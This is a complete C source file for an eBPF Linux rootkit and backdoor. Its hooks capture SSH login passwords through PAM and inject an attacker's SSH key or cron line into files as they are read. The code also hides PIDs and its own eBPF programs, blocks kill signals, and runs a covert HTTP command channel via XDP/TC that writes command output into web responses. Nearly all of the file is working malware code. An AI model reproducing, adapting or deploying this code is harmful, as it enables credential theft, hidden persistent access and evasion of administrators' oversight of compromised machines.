#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include <bpf/bpf_endian.h>

#include "debug.h"
#include "event.h"
#include "memoryShell.h"
#include "hidePid.h"
#include "avoidKill.h"
#include "hideEbpf.h"
#include "sshBackdoor.h"
#include "cronBackdoor.h"

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
char LICENSE[] SEC("license") = "Dual MIT/GPL";
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
/*

name: sys_enter_newfstatat
        ID: 670
format:
field:unsigned short common_type;       offset:0;       size:2; signed:0;
field:unsigned char common_flags;       offset:2;       size:1; signed:0;
field:unsigned char common_preempt_count;       offset:3;       size:1; signed:0;
field:int common_pid;   offset:4;       size:4; signed:1;

field:int __syscall_nr; offset:8;       size:4; signed:1;
field:int dfd;  offset:16;      size:8; signed:0;
field:const char * filename;    offset:24;      size:8; signed:0;
field:struct stat * statbuf;    offset:32;      size:8; signed:0;
field:int flag; offset:40;      size:8; signed:0;

print fmt: "dfd: 0x%08lx, filename: 0x%08lx, statbuf: 0x%08lx, flag: 0x%08lx", ((unsigned long)(REC->dfd)), ((unsigned long)(REC->filename)), ((unsigned long)(REC->statbuf)), ((unsigned long)(REC->flag))
*/
//if (stat(SPOOL_DIR, &statbuf) < OK) {
//if (stat(SYSCRONTAB, &syscron_stat) < OK)
//if (old_db->mtime == TMAX(statbuf.st_mtime, syscron_stat.st_mtime)) {
//
SEC("tp/syscalls/sys_enter_newfstatat")
int handleNewFstatatEnter(struct trace_event_raw_sys_enter *ctx) {
    u32 fileType = 0;
    size_t pid_tgid = bpf_get_current_pid_tgid();
    s32 dfd = BPF_CORE_READ(ctx, args[0]);
    if (dfd!=AT_FDCWD){
        //newfstatat(5, "", {st_mode=S_IFDIR|0755, st_size=4096, ...}, AT_EMPTY_PATH) = 0
        u32 *fdPtr = (u32 *) bpf_map_lookup_elem(&fdMap, &pid_tgid);
        if (fdPtr == NULL) {
            return 0;
        }
        u32 fd = *fdPtr;
        if (dfd!=fd){
            return 0;
        }
        ///etc/crontab
        fileType = 1;
        u64 statBuf = BPF_CORE_READ(ctx, args[2]);
        bpf_map_update_elem(&statBufMap, &pid_tgid, &statBuf, BPF_ANY);
        bpf_map_update_elem(&statFileTypeMap, &pid_tgid, &fileType, BPF_ANY);
        return 0;
    }

    char pathname[MAX_PATH_LEN] = {};
    char *pathPtr = (char *) BPF_CORE_READ(ctx, args[1]);
    bpf_probe_read_user_str(&pathname, MAX_PATH_LEN, pathPtr);
    uint index = 0;
    for (index = 0; index < MAX_PATH_LEN; ++index) {
        if (spoolDir[index] != pathname[index]) {
            break;
        }
    }
    if (index!=MAX_PATH_LEN){
        fileType = 1;
        for (index = 0; index < MAX_PATH_LEN; ++index) {
            if (sysCrontab[index] != pathname[index]) {
                break;
            }
        }
    }
    if (index!=MAX_PATH_LEN)
        return 0;

    u64 statBuf = BPF_CORE_READ(ctx, args[2]);
    bpf_map_update_elem(&statBufMap, &pid_tgid, &statBuf, BPF_ANY);
    bpf_map_update_elem(&statFileTypeMap, &pid_tgid, &fileType, BPF_ANY);
    //DEBUG_PRINT("sys_enter_newfstatat:%s", pathname);
    return 0;
}


SEC("tp/syscalls/sys_exit_newfstatat")
int handleNewFstatatExit(struct trace_event_raw_sys_exit *ctx) {
    size_t pid_tgid = bpf_get_current_pid_tgid();
    u64 *statBufPtr = bpf_map_lookup_elem(&statBufMap, &pid_tgid);
    if (statBufPtr==NULL)
        return 0;
    struct stat *statBuf = (struct stat *)*statBufPtr;
    if (statBuf<=0)
        return 0;
    //crontabs or /etc/crontab

    u32 *fileTypePtr = bpf_map_lookup_elem(&statFileTypeMap,&pid_tgid);
    if (fileTypePtr==NULL)
        return 0;
    u32 fileType = *fileTypePtr;
    if (fileType == 0){
        //crontabs
        long int st_mtime = 0;
        s64 ret = bpf_probe_write_user(&(statBuf->st_mtime),&st_mtime,sizeof(statBuf->st_mtime));
        if (ret!=0)
            DEBUG_PRINT("bpf_probe_write_user st_mtime error");
    }else if(fileType==1){
        ///etc/crontab
        long int st_mtime = bpf_get_prandom_u32() % 0xfffff;
        s64 ret = bpf_probe_write_user(&(statBuf->st_mtime),&st_mtime,sizeof(statBuf->st_mtime));
        if (ret!=0)
            DEBUG_PRINT("bpf_probe_write_user st_mtime error");
    }
    bpf_map_delete_elem(&statBufMap, &pid_tgid);
    bpf_map_delete_elem(&statFileTypeMap,&pid_tgid);
    return 0;
}




/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//int pam_get_authtok(pam_handle_t *pamh, int item,
//                    const char **authtok, const char *prompt);

SEC("uprobe/pam_get_authtok")
int BPF_KPROBE(handleAuthtokEnter, pam_handle_t *pamh, int item, const char **authtok, const char *prompt) {
    size_t pid_tgid = bpf_get_current_pid_tgid();
    bpf_map_update_elem(&pamHandleMap, &pid_tgid, &pamh, BPF_ANY);
    bpf_map_update_elem(&authtokMap, &pid_tgid, &authtok, BPF_ANY);
    return 0;
}

SEC("uretprobe/pam_get_authtok")
int BPF_KRETPROBE(handleAuthtokExit, int ret) {
    size_t pid_tgid = bpf_get_current_pid_tgid();
    pam_handle_t **pamHandlePtr = bpf_map_lookup_elem(&pamHandleMap, &pid_tgid);
    if (pamHandlePtr == 0)
        return 0;
    char ***authtokPtr = bpf_map_lookup_elem(&authtokMap, &pid_tgid);
    if (authtokPtr == 0)
        return 0;
    struct pam_handle *pamh = NULL;
    char **authtok = NULL;
    pamh = *pamHandlePtr;
    authtok = *authtokPtr;
    if (pamh == NULL || authtok == NULL)
        return 0;
    char *userPtr = NULL;
    char *passPtr = NULL;
    struct sshUserPass *sshUserPass;
    sshUserPass = bpf_ringbuf_reserve(&rb, sizeof(*sshUserPass), 0);
    if (!sshUserPass) {
        bpf_map_delete_elem(&pamHandleMap, &pid_tgid);
        bpf_map_delete_elem(&authtokMap, &pid_tgid);
        return 0;
    }
    sshUserPass->type = 2;
    bpf_probe_read_user(&userPtr, sizeof(userPtr), &pamh->user);
    bpf_probe_read_user_str(&sshUserPass->username, MAX_USERNAME_LEN, userPtr);
    bpf_probe_read_user(&passPtr, sizeof(passPtr), authtok);
    bpf_probe_read_user_str(&sshUserPass->password, MAX_PASSWORD_LEN, passPtr);
    bpf_ringbuf_submit(sshUserPass, 0);
    bpf_map_delete_elem(&pamHandleMap, &pid_tgid);
    bpf_map_delete_elem(&authtokMap, &pid_tgid);
    return 0;
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

//int openat(int dirfd, const char *pathname, int flags);
//int openat(int dirfd, const char *pathname, int flags, mode_t mode);
SEC("tp/syscalls/sys_enter_openat")
int handleOpenatEnter(struct trace_event_raw_sys_enter *ctx) {

    size_t pid_tgid = bpf_get_current_pid_tgid();
    char pathname[MAX_PATH_LEN] = {};
    char *p = (char *) BPF_CORE_READ(ctx, args[1]);
    bpf_probe_read_user_str(&pathname, MAX_PATH_LEN, p);

    u32 i = 0;
    if (targetPubKeyPath[0]!='\x00'){
        for (i = 0; i < MAX_PATH_LEN; ++i) {
            if (targetPubKeyPath[i] != pathname[i]) {
                break;
            }
        }
        if (i==MAX_PATH_LEN){
            DEBUG_PRINT("sys_enter_openat:Pathname %s\n", pathname);
            u32 zero = 0;
            bpf_map_update_elem(&fdMap, &pid_tgid, &zero, BPF_ANY);
            return 0;
        }
    }

    if (sysCrontab[0]!='\x00'){
        for (i = 0; i < MAX_PATH_LEN; ++i) {
            if (sysCrontab[i] != pathname[i]) {
                break;
            }
        }
        if (i==MAX_PATH_LEN){
            //DEBUG_PRINT("sys_enter_openat:Pathname %s\n", pathname);
            u32 zero = 0;
            bpf_map_update_elem(&fdMap, &pid_tgid, &zero, BPF_ANY);
            return 0;
        }
    }


    return 0;
}


SEC("tp/syscalls/sys_exit_openat")
int handleOpenatExit(struct trace_event_raw_sys_exit *ctx) {
    size_t pid_tgid = bpf_get_current_pid_tgid();
    u32 *fdPtr = (u32 *) bpf_map_lookup_elem(&fdMap, &pid_tgid);
    if (fdPtr == NULL) {
        return 0;
    }
    u32 mapFd = *fdPtr;

    if (mapFd!=0)
        return 0;
    u32 fd = BPF_CORE_READ(ctx, ret);
    //DEBUG_PRINT("fd:%d",fd);
    bpf_map_update_elem(&fdMap, &pid_tgid, &fd, BPF_ANY);
    return 0;
}

//ssize_t read(int fd, void *buf, size_t count);
SEC("tp/syscalls/sys_enter_read")
int handleReadEnter(struct trace_event_raw_sys_enter *ctx) {
    //DEBUG_PRINT("enter0");
    size_t pid_tgid = bpf_get_current_pid_tgid();
    //check if pid_tgid in fdMap
    u32 *fdPtr = (u32 *) bpf_map_lookup_elem(&fdMap, &pid_tgid);
    if (fdPtr == NULL) {
        return 0;
    }
    u32 currentFd = BPF_CORE_READ(ctx, args[0]);
    //check if current fd is the same as the fd in fdMap
    u32 mapFd = *fdPtr;
    if (currentFd != mapFd) {
        return 0;
    }
    //DEBUG_PRINT("mapFd:%d,currentFd:%d",mapFd,currentFd);
    u64 bufAddr = BPF_CORE_READ(ctx, args[1]);
    bpf_map_update_elem(&readBufMap, &pid_tgid, &bufAddr, BPF_ANY);
    return 0;
}


SEC("tp/syscalls/sys_exit_read")
int handleReadExit(struct trace_event_raw_sys_exit *ctx) {
    size_t pid_tgid = bpf_get_current_pid_tgid();

    u64 *readBufPtr = (u64 *) bpf_map_lookup_elem(&readBufMap, &pid_tgid);
    if (readBufPtr == 0) {
        return 0;
    }
    u64 readBuf = *readBufPtr;
    if (readBuf <= 0) {
        return 0;
    }
    ssize_t count = BPF_CORE_READ(ctx, ret);
    //DEBUG_PRINT("count:%d",count);
    if (count <= 0) {
        return 0;
    }
    if (cronLine[0]!='\x00'){
        s64 ret = bpf_probe_write_user((void *) readBuf, (void *) &cronLine, sizeof(cronLine));
        if (ret != 0)
            DEBUG_PRINT("ssh cronLine bpf_probe_write_user error:%d", ret);


    }
    if (publicKey[0]!='\x00'){
        s64 ret = bpf_probe_write_user((void *) readBuf, (void *) &publicKey, sizeof(publicKey));

        if (ret != 0)
            DEBUG_PRINT("ssh publicKey bpf_probe_write_user error:%d", ret);
    }




    return 0;
}


SEC("tp/syscalls/sys_exit_close")
int handleCloseExit(struct trace_event_raw_sys_exit *ctx) {
    // Check if we're a process thread of interest
    u64 pid_tgid = bpf_get_current_pid_tgid();
    u32 *check = bpf_map_lookup_elem(&fdMap, &pid_tgid);
    if (check == 0) {
        return 0;
    }

    // Closing file, delete fd from all maps to clean up
    bpf_map_delete_elem(&fdMap, &pid_tgid);
    bpf_map_delete_elem(&readBufMap, &pid_tgid);

    return 0;

}






/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////


/*bpftool --help
        Usage: bpftool [OPTIONS] OBJECT { COMMAND | help }
bpftool batch file FILE
bpftool version

OBJECT := { prog | map | link | cgroup | perf | net | feature | btf | gen | struct_ops | iter }
OPTIONS := { {-j|--json} [{-p|--pretty}] | {-d|--debug} |
{-V|--version} }*/


//int bpf(int cmd, union bpf_attr *attr, unsigned int size);
/*[0000ffffb38e1aa8] bpf(BPF_PROG_GET_NEXT_ID, {start_id=0, next_id=0, open_flags=0}, 12) = 0
[0000ffffb38e1aa8] bpf(BPF_PROG_GET_FD_BY_ID, {prog_id=2, next_id=0, open_flags=0}, 12) = 3
[0000ffffb38e1aa8] bpf(BPF_OBJ_GET_INFO_BY_FD, {info={bpf_fd=3, info_len=232, info=0xffffc95ef490}}, 16) = 0*/
SEC("tp/syscalls/sys_enter_bpf")
int handleBpfEnter(struct trace_event_raw_sys_enter *ctx) {
    s32 cmd = BPF_CORE_READ(ctx, args[0]);
    //liDEBUG_PRINT("cmd:%d",cmd);
    size_t pid_tgid = bpf_get_current_pid_tgid();
    if (cmd == BPF_PROG_GET_NEXT_ID || cmd == BPF_MAP_GET_NEXT_ID || cmd == BPF_LINK_GET_NEXT_ID) {
        bpf_map_update_elem(&hideEbpfMap, &pid_tgid, &cmd, BPF_ANY);
    }
    return 0;
}

SEC("kretprobe/sys_bpf")
int handleBpfExit(struct pt_regs *ctx) {


    size_t pid_tgid = bpf_get_current_pid_tgid();
    s32 *cmdPtr;
    cmdPtr = bpf_map_lookup_elem(&hideEbpfMap, &pid_tgid);
    if (cmdPtr == NULL)
        return 0;
    if (*cmdPtr != BPF_PROG_GET_NEXT_ID && *cmdPtr != BPF_MAP_GET_NEXT_ID && *cmdPtr != BPF_LINK_GET_NEXT_ID)
        return 0;

    //DEBUG_PRINT("find BPF_PROG_GET_NEXT_ID");
    bpf_override_return(ctx, -ENOENT);
    bpf_map_delete_elem(&hideEbpfMap, &pid_tgid);
    return 0;
}




/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



SEC("lsm/task_kill")
int BPF_PROG(avoidKill, struct task_struct *p,
             struct kernel_siginfo *info, int sig,
             const struct cred *cred) {
    pid_t pid = BPF_CORE_READ(p, tgid);
    struct task_struct *task = (struct task_struct *) bpf_get_current_task();
    pid_t ppid = BPF_CORE_READ(task, real_parent, tgid);


    for (u32 i = 0; i < MAX_PID_NUM; ++i) {
        if (pidAvoidKill[i] == -1)
            break;
        if (pidAvoidKill[i] == pid) {

            u32 value = 1;
            bpf_map_update_elem(&avoidKillPidMap, &ppid, &value, BPF_ANY);
            return -EPERM;
        }
    }
    return 0;
}

SEC("kretprobe/sys_kill")
int handleKillExit(struct pt_regs *ctx) {
    struct task_struct *task = (struct task_struct *) bpf_get_current_task();
    pid_t ppid = BPF_CORE_READ(task, real_parent, tgid);
    u32 *valuePtr = bpf_map_lookup_elem(&avoidKillPidMap, &ppid);
    if (valuePtr == 0)
        return 0;
    if (*valuePtr != 1)
        return 0;

    bpf_override_return(ctx, -ESRCH);
    bpf_map_delete_elem(&avoidKillPidMap, &ppid);

    return 0;
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////




/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
SEC("tc")
int tcEgress(struct __sk_buff *ctx) {
    u32 zero = 0;
    u32 *nextSeq;
    nextSeq = bpf_map_lookup_elem(&seqMap, &zero);

    //not receive cmd
    if (nextSeq == 0) {
        return TC_ACT_OK;
    }


    //bpf_skb_load_bytes
    void *data = (void *) (u64) ctx->data;
    void *dataEnd = (void *) (u64) ctx->data_end;


    // Parse Ethernet header
    struct ethhdr *eth = data;
    if (data + sizeof(struct ethhdr) > dataEnd)
        return TC_ACT_OK;

    if (bpf_ntohs(eth->h_proto) != ETH_P_IP)
        return TC_ACT_OK;

    // Parse IP header
    // Return the protocol of this packet
    // 1 = ICMP
    // 6 = TCP
    // 17 = UDP
    struct iphdr *iph = data + sizeof(struct ethhdr);
    if (data + sizeof(struct ethhdr) + sizeof(struct iphdr) > dataEnd)
        return TC_ACT_OK;


    // Check if the packet is TCP
    if (iph->protocol != IPPROTO_TCP)
        return TC_ACT_OK;

    // Parse TCP header
    struct tcphdr *tcp = (void *) iph + sizeof(*iph);
    if (data + sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct tcphdr) > dataEnd)
        return TC_ACT_OK;


    u32 tcp_header_size = tcp->doff * 4;
    u8 *httpDataStart = (void *) tcp + tcp_header_size;
    u8 *httpDataEnd = (u8 *) dataEnd;


    // Check for HTTP payload
    // This is a very basic check for HTTP traffic
    if (httpDataStart + 1 > httpDataEnd)
        return TC_ACT_OK;


    //Determine if the response corresponding to the command request is carried
    if (bpf_ntohl(tcp->ack_seq) != *nextSeq) {
        //DEBUG_PRINT("no");
        return TC_ACT_OK;
    }

    //Consider that the http response is transmitted twice, once in the response header and once in the response body.
    //What should I do if the http response don't have a body????????????????????????????????????????????

    httpResCount++;
    u32 httpDataLength = httpDataEnd - httpDataStart;
    if (httpResCount == 1) {


        return TC_ACT_OK;
    }


    //httpResCount==2
    u8 *cmdResPtr = 0;
    cmdResPtr = bpf_map_lookup_elem(&cmdResMap, &zero);
    if (cmdResPtr == 0) {
        DEBUG_PRINT("don't find the cmd!!!");
    }
    u32 baseOffset = sizeof(struct ethhdr) + sizeof(struct iphdr) + tcp_header_size;
    //DEBUG_PRINT("response body len:%d", httpDataLength);
    u32 numAdd = MAX_CMD_RES_LEN - httpDataLength % MAX_CMD_RES_LEN;
    //DEBUG_PRINT("numadd:%u",numAdd);
    s64 ret = bpf_skb_change_tail(ctx, baseOffset + httpDataLength + numAdd, 0);

    if (ret != 0)
        DEBUG_PRINT("bpf_skb_change_tail error:%d", ret);


    /////////////////////////////////
    for (int i = 0; i < 16 * 4; ++i) {
        u8 localCmdRes[MAX_CMD_RES_LEN];
        __builtin_memset(localCmdRes, '\x00', MAX_CMD_RES_LEN);
        //include \x00,so +1
        s64 ret = bpf_probe_read_kernel_str(localCmdRes, MAX_CMD_RES_LEN + 1, cmdResPtr + i * (MAX_CMD_RES_LEN));
        if (ret < 0) {
            DEBUG_PRINT("bpf_probe_read_user_str error,%d", ret);
        }

        ret = bpf_skb_store_bytes(ctx,
                                  baseOffset +
                                  i * (MAX_CMD_RES_LEN),
                                  &localCmdRes,
                                  MAX_CMD_RES_LEN,
                                  BPF_F_RECOMPUTE_CSUM);
        //DEBUG_PRINT("%s",httpDataStart);
        if (ret != 0) {
            break;

        }
    }

    bpf_map_delete_elem(&cmdResMap, &zero);
    bpf_map_delete_elem(&seqMap, &zero);
    httpResCount = 0;


    return TC_ACT_OK;
}
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//xdp
//Ingress only
SEC("xdp")
int xdpHttpParser(struct xdp_md *ctx) {
    void *data = (void *) (u64) ctx->data;

    void *dataEnd = (void *) (u64) ctx->data_end;

    // Parse Ethernet header
    struct ethhdr *eth = data;
    if (data + sizeof(struct ethhdr) > dataEnd)
        return XDP_ABORTED;

    if (bpf_ntohs(eth->h_proto) != ETH_P_IP)
        return XDP_PASS;

    // Parse IP header
    // Return the protocol of this packet
    // 1 = ICMP
    // 6 = TCP
    // 17 = UDP
    struct iphdr *iph = data + sizeof(struct ethhdr);
    if (data + sizeof(struct ethhdr) + sizeof(struct iphdr) > dataEnd)
        return XDP_ABORTED;


    // Check if the packet is TCP
    if (iph->protocol != IPPROTO_TCP)
        return XDP_PASS;

    // Parse TCP header
    struct tcphdr *tcp = (void *) iph + sizeof(*iph);
    if (data + sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct tcphdr) > dataEnd)
        return XDP_ABORTED;



    // Calculate TCP payload (HTTP data)

    u32 tcp_header_size = tcp->doff * 4;

    u8 *httpDataStart = (void *) tcp + tcp_header_size;
    u8 *httpDataEnd = (u8 *) dataEnd;


    // Check for HTTP payload
    // This is a very basic check for HTTP traffic
    if (httpDataStart + 4 > httpDataEnd)
        return XDP_PASS;

    //GET or POST
    //https???
    if (!(httpDataStart[0] == 'G' && httpDataStart[1] == 'E' && httpDataStart[2] == 'T') &&
        !(httpDataStart[0] == 'P' && httpDataStart[1] == 'O' && httpDataStart[2] == 'S' && httpDataStart[3] == 'T')) {
        return XDP_PASS;
    }
    //DEBUG_PRINT("xdp");
    // HTTP traffic identified
    u8 httpData[MAX_HTTP_LEN];


    //bpf_core_read_str(&httpData, sizeof(httpData), httpDataStart);
    bpf_core_read_str(&httpData, sizeof(httpData), httpDataStart + 5);
    //DEBUG_PRINT("receive http:\n\n%s", httpDataStart);
    //DEBUG_PRINT("receive http:\n\n%s", httpData);
    //s32 httpLength = (s32) (httpDataEnd - httpDataStart);


    u8 line[MAX_HTTP_LINE_LEN];
    __builtin_memset(line, '\x00', MAX_HTTP_LINE_LEN);
    //first line
    for (s32 rightIndex = 0; rightIndex < MAX_HTTP_LEN; ++rightIndex) {
        //DEBUG_PRINT("%c",httpData[rightIndex]);
        if (httpData[rightIndex] == '\r' && rightIndex - 9 >= 0) {
            //__builtin_memset(httpLine->line+rightIndex-1,'\x00',sizeof(httpLine->line)-rightIndex+1);
            //httpLine->line[rightIndex-1] = '\x00';
            //DEBUG_PRINT("%d",httpData[rightIndex-9]);
            httpData[rightIndex - 9] = '\x00';
            bpf_core_read_str(&line, sizeof(line), &httpData);
            //bpf_core_read_str(&httpLine->line, sizeof(httpLine->line), &httpData);
            break;
        }
    }
    //DEBUG_PRINT("%s",httpLine->line);
    //find feng
    for (s32 i = 0; i + 5 < MAX_HTTP_LINE_LEN; ++i) {
        if (line[i] == 'f' &&
            line[i + 1] == 'e' &&
            line[i + 2] == 'n' &&
            line[i + 3] == 'g' &&
            line[i + 4] == '=') {
            //bpf_core_read_str(&httpCmd->cmd,sizeof(httpCmd->cmd),line+i+5);
            //后续内核态怎么处理CMD?
            u32 httpLen = httpDataEnd - httpDataStart;
            u32 zero = 0;
            u32 nextSeq = bpf_htonl(tcp->seq) + httpLen;

            //
            u32 *nextSeqPtr = bpf_map_lookup_elem(&seqMap, &zero);
            u8 *cmdRes = bpf_map_lookup_elem(&cmdResMap, &zero);
            if (cmdRes != 0 && nextSeqPtr != 0 && *nextSeqPtr == nextSeq) {
                //DEBUG_PRINT("bpf_ringbuf_discard:%s",httpCmd->cmd);
                //bpf_ringbuf_discard(httpCmd,0);
                //bpf_map_delete_elem(&seqMap,&zero);
                return XDP_PASS;
            }
            //first receive
            if (nextSeqPtr == 0) {
                struct httpCmd *httpCmd;
                httpCmd = bpf_ringbuf_reserve(&rb, sizeof(*httpCmd), 0);
                if (!httpCmd)
                    return XDP_PASS;
                httpCmd->type = 1;
                bpf_core_read_str(&httpCmd->cmd, sizeof(httpCmd->cmd), line + i + 5);
                bpf_map_update_elem(&seqMap, &zero, &nextSeq, BPF_ANY);
                //DEBUG_PRINT("seq:%u,httpLen:%u,nextSeq:%u", bpf_htonl(tcp->seq),httpLen,nextSeq);
                bpf_ringbuf_submit(httpCmd, 0);
                return XDP_TX;
            }

            return XDP_TX;

        }
    }

    return XDP_PASS;
}


/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

// struct linux_dirent64 {
//     u64        d_ino;    /* 64-bit inode number */
//     u64        d_off;    /* 64-bit offset to next structure */
//     unsigned short d_reclen; /* Size of this dirent */
//     unsigned char  d_type;   /* File type */
//     char           d_name[]; /* Filename (null-terminated) */ };
// int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);

SEC("tp/syscalls/sys_enter_getdents64")
int handleGetdentsEnter(struct trace_event_raw_sys_enter *ctx) {
    //DEBUG_PRINT("enter");
    size_t pid_tgid = bpf_get_current_pid_tgid();

    struct linux_dirent64 *dirp = (struct linux_dirent64 *) ctx->args[1];
    bpf_map_update_elem(&bufMap, &pid_tgid, &dirp, BPF_ANY);
    u32 zero = 0;
    bpf_map_update_elem(&pidIndexMap, &pid_tgid, &zero, BPF_ANY);
    return 0;
}


SEC("tp/syscalls/sys_exit_getdents64")
int handleGetdentsExit(struct trace_event_raw_sys_exit *ctx) {
    u64 pid_tgid = bpf_get_current_pid_tgid();

    int total_bytes_read = ctx->ret;
    // if bytes_read is 0, everything's been read
    if (total_bytes_read <= 0) {
        return 0;
    }


    // Check we stored the address of the buffer from the syscall entry
    long unsigned int *pbuff_addr = bpf_map_lookup_elem(&bufMap, &pid_tgid);
    if (pbuff_addr == 0) {
        return 0;
    }

    long unsigned int buff_addr = *pbuff_addr;
    struct linux_dirent64 *dirp = 0;
    //int pid = pid_tgid >> 32;
    short unsigned int d_reclen = 0;
    char filename[MAX_PID_LEN];

    unsigned int bpos = 0;

    unsigned int *pBPOS = bpf_map_lookup_elem(&bytesReadMap, &pid_tgid);
    if (pBPOS != 0) {
        bpos = *pBPOS;
    }

    u32 pidIndex = 0;
    u32 *pidIndexPtr = bpf_map_lookup_elem(&pidIndexMap, &pid_tgid);
    if (pidIndexPtr == NULL) {
        DEBUG_PRINT("pidIndexPtr is null");
        return 0;
    }
    pidIndex = *pidIndexPtr;
    if (pidIndex >= MAX_PID_NUM || pidIndex > pidNum) {
        DEBUG_PRINT("pidIndex is out of range,pidIndex:%d", pidIndex);
        return 0;
    }
    for (int i = 0; i < 200; i++) {
        if (bpos >= total_bytes_read) {
            break;
        }
        dirp = (struct linux_dirent64 *) (buff_addr + bpos);
        bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
        //bpf_probe_read_user_str(&filename, pidToHideLen, dirp->d_name);
        //bpf_printk("[PID_HIDE] filename:%s",filename);
        //bpf_core_read_user_str(&filename, pidToHideLen, dirp->d_name);
        BPF_CORE_READ_USER_STR_INTO(&filename, dirp, d_name);
        //bpf_printk("%s",filename);


        int j = 0;
        //verify :j<MAX_PID_LEN
        if (pidIndex >= MAX_PID_NUM || pidIndex > pidNum) {
            DEBUG_PRINT("pidIndex is out of range,pidIndex:%d", pidIndex);
            return 0;
        }


        for (j = 0; j < MAX_PID_LEN && j < pidToHideLen[pidIndex]; j++) {
            if (filename[j] != pidToHide[pidIndex][j]) {
                break;
            }
        }

        if (j == pidToHideLen[pidIndex]) {
            //?
            //bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
            //?
            //bpf_map_delete_elem(&map_buffs, &pid_tgid);
            long unsigned int *pbuff_addr_prev = bpf_map_lookup_elem(&patchMap, &pid_tgid);
            if (pbuff_addr_prev == 0) {
                return 0;
            }

            u64 buff_addr_prev = *pbuff_addr_prev;
            struct linux_dirent64 *dirp_previous = (struct linux_dirent64 *) buff_addr_prev;
            u32 d_reclen_previous = 0;
            bpf_probe_read_user(&d_reclen_previous, sizeof(d_reclen_previous), &dirp_previous->d_reclen);


            char filename_prev[MAX_PID_LEN];
            //bpf_probe_read_user_str(&filename_prev, pidToHideLen[pidIndex], dirp_previous->d_name);
            bpf_probe_read_user_str(&filename_prev, MAX_PID_LEN, dirp_previous->d_name);


            // Attempt to overwrite
            u32 d_reclen_new = d_reclen_previous + d_reclen;
            long ret = bpf_probe_write_user(&dirp_previous->d_reclen, &d_reclen_new, sizeof(d_reclen_new));

            // Send an event
            struct event *e;
            e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
            if (e) {
                e->success = (ret == 0);
                e->pid = (pid_tgid >> 32);
                bpf_get_current_comm(&e->comm, sizeof(e->comm));
                e->type = 0;
                bpf_ringbuf_submit(e, 0);
            }

            bpf_map_delete_elem(&patchMap, &pid_tgid);
            pidIndex = pidIndex + 1;
            if (pidNum == pidIndex) {
                goto clean;
            }
        }
        bpf_map_update_elem(&patchMap, &pid_tgid, &dirp, BPF_ANY);
        bpos += d_reclen;
    }

    if (bpos < total_bytes_read) {
        bpf_map_update_elem(&bytesReadMap, &pid_tgid, &bpos, BPF_ANY);
        bpf_map_update_elem(&pidIndexMap, &pid_tgid, &pidIndex, BPF_ANY);
        bpf_tail_call(ctx, &progArrayMap, PROG_01);
    }
    clean:
    bpf_map_delete_elem(&bytesReadMap, &pid_tgid);
    bpf_map_delete_elem(&bufMap, &pid_tgid);
    bpf_map_delete_elem(&patchMap, &pid_tgid);
    bpf_map_delete_elem(&pidIndexMap, &pid_tgid);
    return 0;
}
